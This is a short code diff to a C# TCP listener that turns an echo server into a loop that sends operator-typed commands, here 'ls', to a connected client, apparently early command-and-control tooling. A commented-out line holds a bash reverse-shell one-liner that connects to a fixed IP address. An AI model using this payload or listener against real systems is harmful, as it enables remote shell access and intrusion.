@@ -116,7 +116,20 @@ namespace tcp_listener
                         }*/
                         // Loop to receive all the data sent by the client.
                         
-                        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
+                        while (client.Connected)
+                        {
+                            //Byte[] newbytes = new Byte[256];
+                            string text = Console.ReadLine();
+                            if (text == "linux")
+                            {
+                                //string payload = "bash -i >& /dev/tcp/10.0.2.15/100 0>&1";
+                                string te = "ls";
+                                byte[] msg = System.Text.Encoding.ASCII.GetBytes(te);
+                                stream.Write(msg, 0, msg.Length);
+                            }
+                        }
+
+                        /*while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                         {
                             // Translate data bytes to a ASCII string.
                             data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
@@ -134,7 +147,7 @@ namespace tcp_listener
                             // Send back a response.
                             stream.Write(msg, 0, msg.Length);
                             Console.WriteLine("Sent: {0}", data);
-                        }
+                        }*/
 
                         // Shutdown and end connection
                         client.Close();
